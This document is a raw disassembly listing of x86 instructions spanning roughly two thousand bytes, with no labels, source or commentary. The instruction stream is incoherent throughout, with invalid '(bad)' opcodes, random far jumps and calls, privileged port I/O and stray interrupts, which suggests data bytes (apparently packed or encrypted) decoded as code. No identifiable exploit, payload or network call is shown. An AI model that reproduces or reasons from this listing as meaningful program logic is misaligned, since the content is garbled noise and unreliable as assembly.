  414b93:	fbstp  TBYTE PTR [esi]
  414b95:	ficomp WORD PTR [ebx+eiz*4]
  414b98:	in     eax,dx
  414b99:	push   es
  414b9a:	add    DWORD PTR [eax],ecx
  414b9c:	das    
  414b9d:	aaa    
  414b9e:	adc    dl,bl
  414ba0:	mov    edx,0xb14f24b
  414ba5:	repnz lock jmp 0xcba8:0x474cd9f5
  414bae:	(bad)  
  414baf:	xor    eax,0xed971871
  414bb4:	sub    BYTE PTR [ecx+ebp*1],ah
  414bb7:	imul   ebx,DWORD PTR [edi+eax*1-0x48f303b5],0x27
  414bbf:	out    dx,eax
  414bc0:	pushf  
  414bc1:	div    ebp
  414bc3:	adc    DWORD PTR gs:[esi],edx
  414bc6:	sub    DWORD PTR [esi-0x338f45ca],esp
  414bcc:	ficomp WORD PTR [edi-0x76]
  414bcf:	std    
  414bd0:	inc    edx
  414bd1:	shrd   edi,edx,0xd5
  414bd5:	xchg   edi,eax
  414bd6:	xor    DWORD PTR [edx-0x621d0ad4],edi
  414bdc:	fcmovu st,st(7)
  414bde:	es mov al,0x4
  414be1:	and    al,0x81
  414be3:	mov    esi,0x886287c8
  414be8:	xchg   ecx,eax
  414be9:	cld    
  414bea:	test   eax,edi
  414bec:	sub    eax,edx
  414bee:	in     al,dx
  414bef:	mov    ds:0x4367bfd8,al
  414bf4:	inc    eax
  414bf5:	lock ins DWORD PTR es:[edi],dx
  414bf7:	(bad)  
  414bf8:	lds    ebp,FWORD PTR [ebx+esi*2-0x18]
  414bfc:	ins    DWORD PTR es:[edi],dx
  414bfd:	nop
  414bfe:	and    ch,BYTE PTR [ebx-0x6e]
  414c01:	lahf   
  414c02:	repz neg DWORD PTR ss:[esi+0x34642dc1]
  414c0a:	xor    DWORD PTR [edx+0x2f],0xc059a475
  414c11:	add    DWORD PTR [ecx],0x89577d77
  414c17:	jne    0x414c81
  414c19:	xchg   DWORD PTR [ebx*2-0xbabd8d1],esi
  414c20:	enter  0x538f,0xab
  414c24:	les    esp,FWORD PTR [ecx]
  414c26:	push   0xde240c9
  414c2b:	dec    esi
  414c2c:	std    
  414c2d:	add    ah,ah
  414c2f:	(bad)  
  414c30:	int    0xfe
  414c32:	mov    dh,0xb0
  414c34:	jno    0x414c67
  414c36:	jecxz  0x414bc4
  414c38:	repnz sub ebx,eax
  414c3b:	jp     0x414c53
  414c3d:	mov    cl,0x31
  414c3f:	sub    dl,BYTE PTR [ecx]
  414c41:	dec    ebp
  414c42:	popf   
  414c43:	retf   
  414c44:	jmp    0x2e12:0x8e72077b
  414c4b:	cmc    
  414c4c:	mov    ch,BYTE PTR [ebx-0x62b1e936]
  414c52:	inc    edx
  414c53:	in     al,dx
  414c54:	ins    BYTE PTR es:[edi],dx
  414c55:	mov    esi,0x7500dc4
  414c5a:	aaa    
  414c5b:	xor    ebx,DWORD PTR [ecx-0x7a7db5f]
  414c61:	pusha  
  414c62:	inc    ebp
  414c63:	shl    DWORD PTR [ecx-0x568dc8c8],0x6e
  414c6a:	cli    
  414c6b:	lock pop eax
  414c6d:	push   edi
  414c6e:	lods   eax,DWORD PTR ds:[esi]
  414c6f:	call   0x774b4b5b
  414c74:	fwait
  414c75:	call   0xc15448ce
  414c7a:	push   ebx
  414c7b:	cmc    
  414c7c:	neg    ebx
  414c7e:	mov    BYTE PTR [ecx],al
  414c80:	shl    DWORD PTR [ebp-0x1f531468],1
  414c86:	aaa    
  414c87:	test   eax,0xbae24dd5
  414c8c:	sar    DWORD PTR [esi-0xa389dd9],1
  414c92:	sub    eax,0x269b73a0
  414c97:	adc    al,0x8a
  414c99:	sbb    BYTE PTR ss:[ebx-0x39f0d695],al
  414ca0:	fsub   QWORD PTR [ebp+ebp*1+0x12b0c89f]
  414ca7:	xchg   ecx,eax
  414ca8:	mov    ds:0x1ffeba7c,eax
  414cad:	fistp  DWORD PTR ds:[bx+di-0x4]
  414cb2:	pop    edi
  414cb3:	in     al,0x4b
  414cb5:	xchg   ecx,eax
  414cb6:	pop    eax
  414cb7:	pop    edx
  414cb8:	sbb    bl,BYTE PTR [ebx+0x2f]
  414cbb:	test   DWORD PTR [edi-0x4d],ecx
  414cbe:	pop    ds
  414cbf:	pop    es
  414cc0:	push   edx
  414cc1:	retf   0xd60d
  414cc4:	aad    0x94
  414cc6:	cs jg  0x414cbd
  414cc9:	jge    0x414d0a
  414ccb:	pop    ss
  414ccc:	push   ss
  414ccd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414cce:	popf   
  414ccf:	xchg   DWORD PTR [eax-0x33a28adb],ebp
  414cd5:	xchg   ebx,eax
  414cd6:	mov    esi,0xa995148e
  414cdb:	out    dx,eax
  414cdc:	ret    
  414cdd:	iret   
  414cde:	aas    
  414cdf:	(bad)  
  414ce1:	inc    edi
  414ce2:	sub    ah,BYTE PTR [ecx-0x74]
  414ce5:	(bad)  
  414ce6:	pop    ebx
  414ce7:	xlat   BYTE PTR ds:[ebx]
  414ce8:	pop    edi
  414ce9:	aaa    
  414cea:	mov    DWORD PTR [ebp+0x66],esi
  414ced:	dec    eax
  414cee:	inc    BYTE PTR [edx]
  414cf0:	mov    eax,0xd9085724
  414cf5:	dec    ebp
  414cf6:	cmp    dh,BYTE PTR [ecx+0x6ffe38c1]
  414cfc:	test   DWORD PTR [ebx],ebp
  414cfe:	push   edx
  414cff:	jmp    0xf25a:0x3c67589
  414d06:	xor    bh,BYTE PTR es:[ebx+0x72]
  414d0a:	jb     0x414cac
  414d0c:	popf   
  414d0d:	out    0xa,eax
  414d0f:	(bad)
  414d12:	dec    edi
  414d13:	loopne 0x414ccb
  414d15:	sti    
  414d16:	dec    ecx
  414d17:	xor    DWORD PTR [eax+ebx*2+0x7c1f4028],ebp
  414d1e:	sar    BYTE PTR ds:0x526ba5db,1
  414d24:	fnstenv [ebx]
  414d26:	inc    edi
  414d27:	mov    esp,0x70ec28e6
  414d2c:	lea    ebx,[ebx+0x2fd38609]
  414d32:	test   BYTE PTR [esi+0x11],dl
  414d35:	std    
  414d36:	mov    bl,0xef
  414d38:	xchg   edi,eax
  414d39:	std    
  414d3a:	stos   DWORD PTR es:[edi],eax
  414d3b:	mov    esi,0x665c5625
  414d40:	cdq    
  414d41:	rcr    BYTE PTR [ecx+edx*2-0x2bd4c47c],0x21
  414d49:	sbb    eax,0x9b647a8f
  414d4e:	popa   
  414d4f:	cld    
  414d50:	mov    al,0xe4
  414d52:	sub    al,0x38
  414d54:	mov    ecx,0xc670561d
  414d59:	adc    ebp,DWORD PTR [eax+ecx*8]
  414d5c:	xchg   BYTE PTR [ecx+0x6a],al
  414d5f:	pop    ss
  414d60:	ins    BYTE PTR es:[edi],dx
  414d61:	adc    ch,BYTE PTR [edx-0x535bfa38]
  414d67:	cmc    
  414d68:	mov    edi,DWORD PTR [esi]
  414d6a:	and    al,0x59
  414d6c:	add    edi,DWORD PTR [edx]
  414d6e:	and    DWORD PTR [edx+0x2c],edx
  414d71:	(bad)  
  414d72:	in     al,0xcf
  414d74:	test   BYTE PTR ds:0x9ad1a78f,bl
  414d7a:	les    edi,FWORD PTR ds:0x1b9d740d
  414d80:	push   0x86b7f40a
  414d85:	fidivr WORD PTR [esi+edi*1-0x73]
  414d89:	bound  ebp,QWORD PTR [edi]
  414d8b:	add    DWORD PTR [edi],esp
  414d8d:	cmp    BYTE PTR [eax+0xe],al
  414d90:	inc    eax
  414d91:	and    bh,bl
  414d93:	sub    bh,ah
  414d95:	retf   0xf32
  414d98:	mov    bh,0x53
  414d9a:	das    
  414d9b:	in     al,0x14
  414d9d:	inc    edi
  414d9e:	retf   0xed69
  414da1:	repnz sbb eax,0x2d1d5116
  414da7:	(bad)  
  414da8:	jecxz  0x414dae
  414daa:	jg     0x414d47
  414dac:	popa   
  414dad:	(bad)  
  414dae:	fiadd  DWORD PTR [ebp-0x7cf56401]
  414db4:	mov    edx,0x5bd4a37c
  414db9:	dec    eax
  414dba:	daa    
  414dbb:	inc    esi
  414dbc:	fsubr  QWORD PTR [eax+0x69]
  414dbf:	sub    BYTE PTR [edi+0x55],0x80
  414dc3:	cmc    
  414dc4:	or     BYTE PTR [esi+0x3436a8c5],bl
  414dca:	lods   eax,DWORD PTR ds:[esi]
  414dcb:	cli    
  414dcc:	cwde   
  414dcd:	gs fwait
  414dcf:	je     0x414dd6
  414dd1:	mov    eax,ds:0x7ae1410c
  414dd6:	les    eax,FWORD PTR [bx+di]
  414dd9:	mov    ah,0x8
  414ddb:	sbb    BYTE PTR [ebp+eax*1+0x556b42a2],0x14
  414de3:	xor    bl,BYTE PTR [ebp+esi*2-0x47]
  414de7:	test   BYTE PTR [eax+ebp*8+0x52],ah
  414deb:	mov    ebx,eax
  414ded:	outs   dx,DWORD PTR ds:[esi]
  414dee:	fistp  DWORD PTR [esi]
  414df0:	dec    edi
  414df1:	test   al,0x5
  414df3:	outs   dx,BYTE PTR ds:[esi]
  414df4:	sub    eax,0x986c6a01
  414df9:	mov    cl,0x28
  414dfb:	adc    eax,0xa260907b
  414e00:	pop    ebx
  414e01:	push   0xffffffee
  414e03:	pusha  
  414e04:	pop    esi
  414e05:	add    dl,bl
  414e07:	fsubr  DWORD PTR [edx-0x2f910e43]
  414e0d:	das    
  414e0e:	aas    
  414e0f:	cmp    BYTE PTR [ebx+0x68ea6be7],0xac
  414e16:	inc    edx
  414e17:	jg     0x414d9f
  414e19:	imul   esi,DWORD PTR [esi+edi*8],0x6680e51a
  414e20:	and    eax,0x61336d05
  414e25:	std    
  414e26:	mov    eax,0xe4ecfcc2
  414e2b:	cmp    eax,0x5d5625cd
  414e30:	pop    es
  414e31:	push   edx
  414e32:	add    ah,BYTE PTR [edx+edx*2]
  414e35:	push   esp
  414e36:	sub    eax,0xe9e6ea6e
  414e3b:	cs test cl,ah
  414e3e:	xor    BYTE PTR [esi],bh
  414e40:	imul   edx,esi,0xb4c719d6
  414e46:	sbb    DWORD PTR [eax+0x5a],edi
  414e49:	xchg   esp,eax
  414e4a:	mov    ecx,0xdf844563
  414e4f:	lea    ebx,[eax+0x6b]
  414e52:	xor    cl,al
  414e54:	mov    ecx,0x1976dd64
  414e59:	add    bl,BYTE PTR [ebx+0x2b7baad3]
  414e5f:	enter  0xd010,0x1
  414e63:	sahf   
  414e64:	or     BYTE PTR [edi+0xc4604c6],dh
  414e6a:	or     al,0x45
  414e6c:	lods   al,BYTE PTR ds:[esi]
  414e6d:	push   ss
  414e6e:	mov    al,dh
  414e70:	mov    ebx,DWORD PTR [eax-0x45]
  414e73:	cmp    al,0xce
  414e75:	ds mov dh,0x47
  414e78:	jle    0x414ec2
  414e7a:	clc    
  414e7b:	jmp    0x9a6c:0x95b64bef
  414e82:	mov    edx,0xef219198
  414e87:	nop
  414e88:	or     bh,BYTE PTR [ecx+0x3c46edad]
  414e8e:	(bad)  
  414e8f:	cs je  0x414e98
  414e92:	test   BYTE PTR [eax],0x3e
  414e95:	nop
  414e96:	and    DWORD PTR [edx+ecx*8],ecx
  414e99:	pop    esp
  414e9a:	ret    0x9a40
  414e9d:	cmp    eax,0x5e5807a
  414ea2:	retf   0x8a2a
  414ea5:	jmp    0x8a7f3e89
  414eaa:	sub    al,0xf7
  414eac:	jb     0x414ebf
  414eae:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414eaf:	pop    es
  414eb0:	cmp    dl,dl
  414eb2:	mov    DWORD PTR ds:0xb820b9d4,ecx
  414eb8:	dec    esp
  414eb9:	lods   eax,DWORD PTR ds:[esi]
  414eba:	jae    0x414eb1
  414ebc:	sti    
  414ebd:	xor    ecx,DWORD PTR [esi]
  414ebf:	inc    eax
  414ec0:	cmp    DWORD PTR [eax],edi
  414ec2:	push   0x2ffbb90c
  414ec7:	push   0x75
  414ec9:	test   DWORD PTR [esi+eax*8],edi
  414ecc:	iret   
  414ecd:	push   cs
  414ece:	outs   dx,BYTE PTR ds:[esi]
  414ecf:	cs pop ds
  414ed1:	(bad)  
  414ed2:	aam    0xcc
  414ed4:	clc    
  414ed5:	mov    bh,0x9c
  414ed7:	cmp    BYTE PTR [ebp+edi*4+0x1cf49266],0x44
  414edf:	ins    BYTE PTR es:[edi],dx
  414ee0:	test   eax,0x20d5ce07
  414ee5:	jge    0x414e7c
  414ee7:	stc    
  414ee8:	pop    esp
  414ee9:	mov    bl,0xd3
  414eeb:	mov    esp,0x87876568
  414ef0:	test   DWORD PTR [edi],edx
  414ef2:	sub    eax,0xcd264997
  414ef7:	or     edi,esi
  414ef9:	sbb    esp,esi
  414efb:	or     al,0xdf
  414efd:	sub    esi,DWORD PTR [edi]
  414eff:	sbb    esi,ebp
  414f01:	pop    edx
  414f02:	inc    esp
  414f03:	mov    al,0x69
  414f05:	push   ecx
  414f06:	addr16 pop ss
  414f08:	sahf   
  414f09:	ret    0x79b6
  414f0c:	mov    cl,0x2e
  414f0e:	or     DWORD PTR [ebx+0x27],ebx
  414f11:	retf   
  414f12:	ins    DWORD PTR es:[edi],dx
  414f13:	dec    esi
  414f14:	ss mov bh,0x50
  414f17:	ss dec ebx
  414f19:	mov    ch,0x55
  414f1b:	popf   
  414f1c:	jecxz  0x414f2a
  414f1e:	shl    esp,cl
  414f20:	ds push cx
  414f23:	push   ebx
  414f24:	xchg   edi,eax
  414f25:	add    al,dl
  414f27:	hlt    
  414f28:	mov    edx,DWORD PTR [ecx-0x48]
  414f2b:	clc    
  414f2c:	mov    ds:0xb66f8bc4,eax
  414f31:	ds repnz pop esp
  414f34:	cmc    
  414f35:	sbb    BYTE PTR [ecx+0x1e90900e],al
  414f3b:	das    
  414f3c:	jns    0x414f81
  414f3e:	inc    esi
  414f3f:	je     0x414f1e
  414f41:	sahf   
  414f42:	arpl   WORD PTR [edi],cx
  414f44:	out    dx,al
  414f45:	ret    
  414f46:	jmp    0x3b64:0x6816681a
  414f4d:	push   eax
  414f4e:	jle    0x414f57
  414f50:	ficom  WORD PTR [edi-0x2eeb84b3]
  414f56:	xchg   edx,eax
  414f57:	sbb    al,bh
  414f59:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414f5a:	push   edi
  414f5b:	sti    
  414f5c:	mov    edi,eax
  414f5e:	mov    esp,0xe4688776
  414f63:	jecxz  0x414f23
  414f65:	dec    esp
  414f66:	daa    
  414f67:	cwde   
  414f68:	add    DWORD PTR [ebx-0x77649b1e],0x50
  414f6f:	fild   QWORD PTR [ecx-0x678535ec]
  414f75:	dec    eax
  414f76:	test   BYTE PTR [eax+0x4c],al
  414f79:	ins    DWORD PTR es:[edi],dx
  414f7a:	or     al,BYTE PTR [ebx+0x3]
  414f7d:	(bad)  
  414f7e:	arpl   di,di
  414f80:	dec    ebp
  414f81:	fdiv   QWORD PTR [ebx-0x163c672d]
  414f87:	adc    edi,ecx
  414f89:	inc    ebx
  414f8a:	cmp    DWORD PTR [eax-0x2fd9913],edx
  414f90:	adc    eax,0xcf9866e2
  414f95:	out    0xa8,al
  414f97:	or     BYTE PTR [esi],al
  414f99:	rcr    bh,1
  414f9b:	lds    esi,FWORD PTR [edx+0x2cf87406]
  414fa1:	dec    ebp
  414fa2:	cli    
  414fa3:	mov    ds:0xf2610375,al
  414fa8:	lock inc edi
  414faa:	xor    eax,0x2ee2d79
  414faf:	fwait
  414fb0:	pop    ecx
  414fb1:	(bad)  
  414fb3:	fdiv   DWORD PTR [ebp+0x5cc260e8]
  414fb9:	out    0x1a,eax
  414fbb:	lahf   
  414fbc:	call   0xe5:0x2cbd7f2
  414fc3:	ja     0x414fb2
  414fc5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414fc6:	jg     0x2811431b
  414fcc:	icebp  
  414fcd:	sbb    al,0x29
  414fcf:	mov    bl,0x45
  414fd1:	repnz in eax,dx
  414fd3:	faddp  st(5),st
  414fd5:	icebp  
  414fd6:	sbb    ah,bl
  414fd8:	pop    esp
  414fd9:	pop    esi
  414fda:	aam    0x90
  414fdc:	jle    0x414fe4
  414fde:	dec    edi
  414fdf:	stc    
  414fe0:	into   
  414fe1:	mov    dl,0x6c
  414fe3:	enter  0x7bce,0x60
  414fe7:	add    BYTE PTR [eax+edx*2],ah
  414fea:	ror    DWORD PTR [ebx+0x17],1
  414fed:	mov    edx,0xc590d2fc
  414ff2:	pop    ebp
  414ff3:	int3   
  414ff4:	sti    
  414ff5:	pop    esi
  414ff6:	sbb    edx,edi
  414ff8:	loopne 0x41506f
  414ffa:	(bad)  
  414ffb:	ins    DWORD PTR es:[edi],dx
  414ffc:	jmp    0x1d7c9112
  415001:	loop   0x414ff5
  415003:	not    DWORD PTR [ebx-0x3d]
  415006:	add    DWORD PTR [ecx+edx*1+0x46],0xd1c4de1c
  41500e:	mov    dh,0xb8
  415010:	mov    al,0xfa
  415012:	xchg   esp,eax
  415013:	jno    0x415055
  415015:	in     eax,0x33
  415017:	sti    
  415018:	xor    DWORD PTR [ebx+0x4a],edi
  41501b:	clc    
  41501c:	push   0x3cf286d5
  415021:	cmc    
  415022:	nop
  415023:	out    0x5b,al
  415025:	jmp    0xc3b8:0xaf4627e9
  41502c:	dec    ebx
  41502d:	fld    QWORD PTR [edi]
  41502f:	aam    0x11
  415031:	and    edi,DWORD PTR [ecx]
  415033:	je     0x414ffa
  415035:	(bad)  
  415036:	xchg   edx,eax
  415037:	jae    0x415075
  415039:	mov    esi,DWORD PTR [eax-0x35]
  41503c:	pop    ebx
  41503d:	and    ch,0xaa
  415040:	ja     0x414fc6
  415042:	js     0x414fe1
  415044:	mov    bh,0xa0
  415046:	push   es
  415047:	(bad)  
  415048:	outs   dx,DWORD PTR ds:[esi]
  415049:	ror    dh,1
  41504b:	cmp    al,0xe2
  41504d:	ins    DWORD PTR es:[edi],dx
  41504e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41504f:	pop    edx
  415050:	pusha  
  415051:	add    ch,BYTE PTR [ebx+0x70]
  415054:	xlat   BYTE PTR ds:[ebx]
  415055:	push   ebp
  415056:	or     ebp,DWORD PTR [ecx]
  415058:	add    ebx,DWORD PTR [esi+eax*8-0x2b]
  41505c:	aam    0x9d
  41505e:	xchg   edi,eax
  41505f:	(bad)  
  415060:	xchg   edi,eax
  415061:	(bad)  
  415062:	std    
  415063:	mov    ds:0xf9960edf,eax
  415068:	test   al,0xe0
  41506a:	mov    al,ds:0x4268d3c5
  41506f:	xor    ebp,DWORD PTR ds:0x116cf69c
  415075:	and    al,0x5d
  415077:	ds jnp 0x415004
  41507a:	pushf  
  41507b:	sbb    dh,ch
  41507d:	push   eax
  41507e:	and    eax,0x496be78a
  415083:	test   BYTE PTR [ebx+0x2e],dl
  415086:	xor    dl,BYTE PTR ss:[ebx]
  415089:	jne    0x4150f3
  41508b:	shl    BYTE PTR [edx-0x63],0xa8
  41508f:	sub    al,0x44
  415091:	sub    cl,BYTE PTR [esi]
  415093:	inc    edi
  415094:	add    BYTE PTR [ecx+ecx*4],cl
  415097:	mov    cl,0xfd
  415099:	ja     0x415061
  41509b:	or     eax,ebx
  41509d:	adc    cl,BYTE PTR [edx+0x2c]
  4150a0:	xor    bh,BYTE PTR [ebx]
  4150a2:	inc    esi
  4150a3:	or     eax,0x4d17d67f
  4150a8:	lods   eax,DWORD PTR ds:[esi]
  4150a9:	add    al,0x84
  4150ab:	jbe    0x41508a
  4150ad:	stos   DWORD PTR es:[edi],eax
  4150ae:	stos   BYTE PTR es:[edi],al
  4150af:	inc    esp
  4150b0:	shl    eax,0x82
  4150b3:	cmp    al,0x7f
  4150b5:	jmp    0x24883327
  4150ba:	cmc    
  4150bb:	icebp  
  4150bc:	or     eax,DWORD PTR [edx+0x1e922eb5]
  4150c2:	aas    
  4150c3:	mov    edi,0x965da4bd
  4150c8:	mov    esi,DWORD PTR [ebx]
  4150ca:	ins    DWORD PTR es:[edi],dx
  4150cb:	xchg   edi,eax
  4150cc:	icebp  
  4150cd:	pop    es
  4150ce:	scas   eax,DWORD PTR es:[edi]
  4150cf:	inc    ecx
  4150d0:	jmp    0xc69c:0x8dd94ba4
  4150d7:	xchg   ebx,ebp
  4150d9:	fisttp WORD PTR [esp+ecx*1]
  4150dc:	pushf  
  4150dd:	imul   esi,DWORD PTR [eax],0x31
  4150e0:	inc    esp
  4150e1:	jl     0x415089
  4150e3:	popf   
  4150e4:	pusha  
  4150e5:	retf   0x62c7
  4150e8:	ins    DWORD PTR es:[edi],dx
  4150e9:	push   es
  4150ea:	ret    0x2c54
  4150ed:	xor    bl,dl
  4150ef:	in     al,0xe9
  4150f1:	out    0xa2,eax
  4150f3:	and    al,0x6b
  4150f5:	pop    ds
  4150f6:	aam    0x6
  4150f8:	je     0x4150cf
  4150fa:	jecxz  0x4150fd
  4150fc:	cmp    DWORD PTR [edi],esi
  4150fe:	jle    0x4150d6
  415100:	dec    DWORD PTR [eax-0x561b4656]
  415106:	mov    eax,0xcd3bf1f8
  41510b:	int    0x71
  41510d:	xlat   BYTE PTR ds:[ebx]
  41510e:	push   0x48
  415110:	sbb    BYTE PTR [ecx],al
  415112:	fld    DWORD PTR [ecx+0x19]
  415115:	leave  
  415116:	dec    edi
  415117:	add    BYTE PTR [edx+edi*8+0x69],al
  41511b:	dec    edx
  41511c:	sti    
  41511d:	jle    0x415193
  41511f:	(bad)  
  415121:	es push ds
  415123:	mov    bh,0x4
  415125:	mov    ebp,DWORD PTR [edx+0x5]
  415128:	xlat   BYTE PTR ds:[ebx]
  415129:	mov    ds:0x8f4ac34e,al
  41512e:	ret    0xab8
  415131:	test   DWORD PTR [eax+0x3bb304dc],esp
  415137:	retf   
  415138:	fs sbb eax,ebx
  41513b:	push   ebp
  41513c:	je     0x41516f
  41513e:	retf   0xbd17
  415141:	xlat   BYTE PTR ds:[ebx]
  415142:	mov    ds:0x880920da,al
  415147:	sub    BYTE PTR [edx],dh
  415149:	jae    0x415101
  41514b:	out    dx,eax
  41514c:	ss aas 
  41514e:	sub    al,0xb5
  415150:	loope  0x415165
  415152:	call   0xbacd:0x22d33151
  415159:	stc    
  41515a:	adc    BYTE PTR [edi-0x75],0x44
  41515e:	xchg   edx,eax
  41515f:	fisubr DWORD PTR [ebx-0x7c]
  415162:	cmp    al,0xa8
  415164:	fistp  WORD PTR [eax+0x1b]
  415167:	hlt    
  415168:	popf   
  415169:	adc    BYTE PTR [edx-0x5e],bh
  41516c:	stos   BYTE PTR es:[edi],al
  41516d:	dec    ebx
  41516e:	data16 js 0x41517a
  415171:	cmp    BYTE PTR [eax+0x17aee8d8],cl
  415177:	adc    ah,0x1e
  41517a:	and    BYTE PTR [edi+ebp*4+0x68309e1a],ah
  415181:	pop    es
  415182:	aaa    
  415183:	fidiv  DWORD PTR [esi]
  415185:	imul   eax,DWORD PTR [ebp-0x56968636],0x3e
  41518c:	dec    esp
  41518d:	adc    al,0xa8
  41518f:	inc    ebx
  415190:	mov    BYTE PTR [edx],ah
  415192:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415193:	push   ds
  415194:	inc    esi
  415195:	test   eax,0xae925076
  41519a:	dec    edx
  41519b:	jg     0x41517f
  41519d:	outs   dx,BYTE PTR ds:[esi]
  41519e:	adc    eax,0x31df9f08
  4151a3:	pop    ebp
  4151a4:	test   DWORD PTR [esi-0x68],esi
  4151a7:	daa    
  4151a8:	adc    al,0xbc
  4151aa:	or     eax,0x8307a74a
  4151af:	test   esp,edi
  4151b1:	sub    ebx,DWORD PTR [edi+0x594f5561]
  4151b7:	mov    edi,0x1a01cf4f
  4151bc:	jle    0x4151c5
  4151be:	stc    
  4151bf:	push   ebp
  4151c0:	inc    edi
  4151c1:	pop    ecx
  4151c2:	xchg   DWORD PTR cs:[edi],eax
  4151c5:	inc    eax
  4151c6:	scas   eax,DWORD PTR es:[edi]
  4151c7:	mov    ch,BYTE PTR [ebx]
  4151c9:	test   bl,0x3d
  4151cc:	fidivr DWORD PTR [edi+0x615c3811]
  4151d2:	push   edi
  4151d3:	shl    edx,cl
  4151d5:	push   ss
  4151d6:	mov    cl,0x39
  4151d8:	pop    esi
  4151d9:	mov    ebx,0xc0534d63
  4151de:	ret    0xc4cc
  4151e1:	push   esp
  4151e2:	pop    edx
  4151e3:	stos   DWORD PTR es:[edi],eax
  4151e4:	scas   eax,DWORD PTR es:[edi]
  4151e5:	pop    ebx
  4151e6:	cdq    
  4151e7:	mov    edi,DWORD PTR [eax]
  4151e9:	jb     0x41516b
  4151eb:	lods   al,BYTE PTR ds:[esi]
  4151ec:	in     al,0x8b
  4151ee:	ins    BYTE PTR es:[edi],dx
  4151ef:	out    0xfd,al
  4151f1:	repnz cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4151f3:	mov    bh,0x95
  4151f5:	adc    eax,0xbc12b77c
  4151fa:	lds    edx,FWORD PTR [ebx]
  4151fc:	loopne 0x41524b
  4151fe:	xchg   edx,eax
  4151ff:	loope  0x415267
  415201:	jg     0x4151c5
  415203:	arpl   WORD PTR [edi-0x25],bp
  415206:	jnp    0x415234
  415208:	out    0x77,al
  41520a:	cmp    edi,DWORD PTR [edi-0x69]
  41520d:	xchg   esi,eax
  41520e:	push   esp
  41520f:	xchg   ecx,eax
  415210:	jecxz  0x415263
  415212:	jno    0x41523d
  415214:	cld    
  415215:	or     dl,ch
  415217:	cdq    
  415218:	(bad)  
  415219:	in     al,dx
  41521a:	mov    al,BYTE PTR [edi+0x14]
  41521d:	in     al,dx
  41521e:	add    al,0x19
  415220:	cmc    
  415221:	fdivr  st,st(0)
  415223:	test   eax,0x45fc8f65
  415228:	add    al,0xcd
  41522a:	jno    0x415208
  41522c:	adc    bl,cl
  41522e:	les    esi,FWORD PTR [ebx*2+0x5dd91016]
  415235:	mov    bl,0x58
  415237:	outs   dx,BYTE PTR ds:[esi]
  415238:	imul   esi,DWORD PTR [edx+0x4e857789],0xa2aeb12f
  415242:	imul   ecx,DWORD PTR [ebx+0x2bd428dd],0xffffff8e
  415249:	ret    
  41524a:	sub    eax,0x1b6b6343
  41524f:	rcr    BYTE PTR [ebx-0x49a0e31a],1
  415255:	mov    bl,0xfe
  415257:	jae    0x4152b1
  415259:	lods   al,BYTE PTR ds:[esi]
  41525a:	dec    ebp
  41525b:	repnz mov bl,0x15
  41525e:	lock sahf 
  415260:	jl     0x415216
  415262:	xchg   edi,eax
  415263:	add    ecx,DWORD PTR [ebx-0x148dfa1b]
  415269:	dec    esi
  41526a:	inc    ebp
  41526b:	cmp    ch,ch
  41526d:	seta   BYTE PTR [ebx+0x1d02124]
  415274:	imul   esi,DWORD PTR [ecx-0x1b],0x4c
  415278:	push   es
  415279:	out    0xb4,al
  41527b:	aaa    
  41527c:	andps  xmm4,XMMWORD PTR [ecx-0x66]
  415280:	rol    BYTE PTR [ebx+eax*8+0xa],cl
  415284:	and    dh,BYTE PTR [esi-0x791c874e]
  41528a:	popf   
  41528b:	and    al,0x61
  41528d:	mov    ebp,0x7397aefc
  415292:	aad    0x80
  415294:	pop    ss
  415295:	(bad)
  415298:	mov    bl,BYTE PTR ds:0xba81e5ea
  41529e:	mov    ch,0xb2
  4152a0:	leave  
  4152a1:	mov    al,es:0x82e7a187
  4152a7:	(bad)  
  4152a8:	cmp    eax,0x8351b030
  4152ad:	retf   
  4152ae:	sar    BYTE PTR [ecx+eax*8+0x3d635760],0xc6
  4152b6:	fcomp  QWORD PTR cs:[ebx+ecx*8-0x61]
  4152bb:	rcr    esp,1
  4152bd:	(bad)  
  4152be:	mov    eax,DWORD PTR [ebx-0x717c51f]
  4152c4:	jns    0x4152f5
  4152c6:	in     eax,0x15
  4152c8:	cmp    al,0x4f
  4152ca:	(bad)  
  4152cc:	repz fcomp DWORD PTR ds:0xc9e8abd7
  4152d3:	or     ecx,ebx
  4152d5:	inc    ebx
  4152d6:	push   ss
  4152d7:	mov    esi,0x294115ad
  4152dc:	xor    ah,BYTE PTR [edi]
  4152de:	bound  ebx,QWORD PTR [ecx-0x3d]
  4152e1:	fst    DWORD PTR [ebx+0x6b9101a9]
  4152e7:	fs das 
  4152e9:	retf   0xa079
  4152ec:	mov    ebp,DWORD PTR [edi-0x3a413ac9]
  4152f2:	pcmpeqw mm0,QWORD PTR [edx]
  4152f5:	fcmovnu st,st(5)
  4152f7:	ds add BYTE PTR ds:[edx],dl
  4152fb:	test   eax,0xaf7212ee
  415300:	cmp    esi,DWORD PTR [ebp-0x9c521fd]
  415306:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415307:	push   sp
  415309:	jo     0x4152ff
  41530b:	(bad)  
  41530c:	stos   DWORD PTR es:[edi],eax
  41530d:	mov    edi,gs
  41530f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415310:	es push ecx
  415312:	repz jmp 0x415381
  415315:	lahf   
  415316:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415317:	nop
  415318:	mov    ecx,0x1785ed9e
  41531d:	inc    ecx
  41531e:	sub    ch,BYTE PTR [ebx+0x284173b8]
  415324:	xchg   ebx,eax
  415325:	or     BYTE PTR [esi+0x0],0x9d
  415329:	cli    
  41532a:	pusha  
  41532b:	jo     0x4152d3
  41532d:	or     dl,BYTE PTR [eax+0x768dbeda]
  415333:	cs test al,0xe1
  415336:	dec    ecx
  415337:	add    BYTE PTR [ecx+ecx*4],dh
  41533a:	adc    eax,0xaeb5b675
  41533f:	(bad)  
  415340:	ja     0x41535a
  415342:	retf   0x5445
  415345:	test   BYTE PTR [eax+0x2b9c2754],ch
  41534b:	mov    ds:0x3cf0c406,al
  415350:	push   esp
  415351:	aad    0x22
  415353:	jl     0x415354
  415355:	ins    DWORD PTR es:[edi],dx
  415356:	call   0x7741:0x6b82be59
  41535d:	(bad)  
  41535e:	aam    0xee
  415360:	aad    0xb7
  415362:	adc    al,0xf1
